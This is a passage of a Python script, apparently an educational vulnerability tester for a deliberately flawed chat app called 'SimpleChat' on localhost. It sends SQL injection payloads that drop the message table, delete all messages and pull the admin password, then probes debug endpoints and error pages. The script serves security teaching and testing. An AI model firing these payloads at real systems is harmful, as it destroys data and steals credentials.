                    "Could not send messages",
                    "Normal message send attempt",
                    description
                )
                return
            
            # Wait a moment for the message to be processed
            time.sleep(1)
            
            # Get the conversation page after sending a normal message
            normal_conversation = self.session.get(
                urljoin(self.base_url, f"/messages/{recipient}")
            )
            
            # Count the number of messages before injection attempts
            message_count_before = normal_conversation.text.count(normal_message)
            
            # If the message wasn't displayed, the test is inconclusive
            if message_count_before == 0:
                self.add_result(
                    "SQL Injection (Messages)",
                    False,
                    "Normal message was not displayed - test inconclusive",
                    "Normal message send attempt",
                    description
                )
                return
            
            # SQL injection payloads to test in messages
            sql_payloads = [
                {
                    "payload": "test message'; DROP TABLE message; --", 
                    "description": "Attempt to drop the message table"
                },
                {
                    "payload": "test message'; DELETE FROM message WHERE 1=1; --", 
                    "description": "Delete all messages"
                },
                {
                    "payload": "test message', (SELECT password FROM user WHERE username='admin')), (1, 1, 'Leaked password: ", 
                    "description": "Extract admin password and insert it as a new message"
                }
            ]
            
            # Try each SQL injection payload
            for payload in sql_payloads:
                # Send message with SQL injection payload
                data = {"message": payload["payload"]}
                if csrf_token:
                    data["csrf_token"] = csrf_token
                    
                injection_response = self.session.post(
                    urljoin(self.base_url, f"/messages/{recipient}"),
                    data=data
                )
                
                # Check if the message was sent
                if injection_response.status_code != 200:
                    continue
                
                # Wait a moment for the message to be processed
                time.sleep(1)
                
                # Get the conversation page after sending the injection
                injection_conversation = self.session.get(
                    urljoin(self.base_url, f"/messages/{recipient}")
                )
                
                # Check for signs of successful injection
                
                # 1. Check if the message count decreased (DELETE worked)
                message_count_after = injection_conversation.text.count(normal_message)
                if message_count_after < message_count_before and message_count_before > 0:
                    self.add_result(
                        "SQL Injection (Messages)",
                        True,
                        f"Possible successful injection (messages deleted): {payload['payload']} ({payload['description']})",
                        payload['payload'],
                        description
                    )
                    return
                
                # 2. Check if we see an error message that indicates SQL syntax error
                sql_error_indicators = [
                    "sql syntax",
                    "syntax error",
                    "sqlite error",
                    "database error",
                    "sql error"
                ]
                
                if any(indicator in injection_conversation.text.lower() for indicator in sql_error_indicators):
                    self.add_result(
                        "SQL Injection (Messages)",
                        True,
                        f"Possible successful injection (caused error): {payload['payload']} ({payload['description']})",
                        payload['payload'],
                        description
                    )
                    return
                
                # 3. Check if sensitive data appears in the response
                sensitive_data_indicators = [
                    "password",
                    "password_hash",
                    "credit_card",
                    "ssn"
                ]
                
                # Check if any of these indicators appear in the response AND weren't in the original payload
                # This helps avoid false positives when the payload itself contains these words
                for indicator in sensitive_data_indicators:
                    if (indicator in injection_conversation.text.lower() and 
                        indicator not in payload["payload"].lower() and
                        indicator not in normal_conversation.text.lower()):
                        self.add_result(
                            "SQL Injection (Messages)",
                            True,
                            f"Possible successful injection (leaked sensitive data): {payload['payload']} ({payload['description']})",
                            payload['payload'],
                            description
                        )
                        return
                
                # 4. Check if the injection payload was stored as-is (secure behavior)
                # If the payload appears exactly as sent, it's likely that the application
                # is properly escaping or parameterizing the input
                if payload["payload"] in injection_conversation.text:
                    # This is actually a sign that the application is secure
                    continue
            
            # If we get here, none of the payloads worked
            self.add_result(
                "SQL Injection (Messages)",
                False,
                "Application properly handled SQL injection attempts in messages",
                str([p["payload"] for p in sql_payloads]),
                description
            )
            
        except Exception as e:
            self.add_result(
                "SQL Injection (Messages)",
                False,
                f"Error: {str(e)}",
                "SQL injection test",
                description
            )

    def test_debug_mode(self):
        """Test debug mode and information disclosure"""
        print("\n=== Testing Debug Mode ===")
        description = """
        Vulnerability: Debug Mode Enabled
        Impact: Attackers can access sensitive debug information and potentially
        execute arbitrary code through the debug console.
        How it works: The application runs with debug mode enabled in production,
        exposing detailed error messages and debug features.
        
        Prevention:
        1. Disable debug mode in production
        2. Use proper error handling
        3. Implement logging instead of debug output
        4. Use environment-specific configurations
        """
        
        try:
            # Check for debug endpoints
            debug_endpoints = [
                "/debug/users",
                "/debug/schema",
                "/debug/data",
                "/debug/all-users",
                "/debug/conversation_hashes",
                "/endpoints"
            ]
            
            accessible_endpoints = []
            
            for endpoint in debug_endpoints:
                response = self.session.get(urljoin(self.base_url, endpoint))
                if response.status_code == 200:
                    accessible_endpoints.append(endpoint)
            
            # Also check for detailed error messages
            error_response = self.session.get(
                urljoin(self.base_url, "/nonexistent_page_to_trigger_error")
            )
            
            error_indicators = [
                "traceback",
                "debug",
                "error",
                "exception",
                "stack trace",
                "line",
                "file"
            ]
            
            detailed_error = any(indicator in error_response.text.lower() for indicator in error_indicators)
            
            success = len(accessible_endpoints) > 0 or detailed_error
            
            details_parts = []
            if accessible_endpoints:
                details_parts.append(f"Accessible debug endpoints: {', '.join(accessible_endpoints)}")
            if detailed_error:
                details_parts.append("Detailed error messages exposed")
            
            details = " | ".join(details_parts) if details_parts else "No debug mode indicators found"
            
            self.add_result(
                "Debug Mode Enabled",
                success,
                details,
                "Checked debug endpoints and error handling",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Debug Mode Enabled",
                False,
                f"Error: {str(e)}",
                "Debug mode test",
                description
            )

    def print_results(self):
        """Print test results in a formatted way"""
        print("\n=== VULNERABILITY TEST RESULTS ===\n")
        
        total_tests = len(self.results)
        successful_tests = sum(1 for r in self.results if r.success)
        
        print(f"Total Tests: {total_tests}")
        print(f"Vulnerabilities Found: {successful_tests}")
        print(f"Failed Tests: {total_tests - successful_tests}")
        print("\nDetailed Results:")
        print("=" * 100)
        
        for result in self.results:
            print(f"\nTest: {result.name}")
            print(f"Status: {'✅ VULNERABLE' if result.success else '❌ NOT VULNERABLE'}")
            print("\nDescription:")
            print(result.description)
            print("\nDetails:", result.details)
            print("\nPayload:", result.payload)
            print("-" * 100)

def main():
    print("""
    🚨 SimpleChat Vulnerability Testing Suite 🚨
    =========================================
    
    This tool demonstrates various web application vulnerabilities in SimpleChat for educational purposes.
    Each test includes:
    - Vulnerability description
    - How it works
    - Impact
    - Prevention measures
    
    ⚠️  WARNING: Use only in controlled environments! ⚠️
    """)
    
    try:
        tester = SimpleChatVulnerabilityTester()
        tester.run_all_tests()
        
    except requests.exceptions.ConnectionError:
        print("\nERROR: Cannot connect to the application.")
        print("Make sure it's running at http://localhost:5001")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\nTesting interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\nAn error occurred: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main() 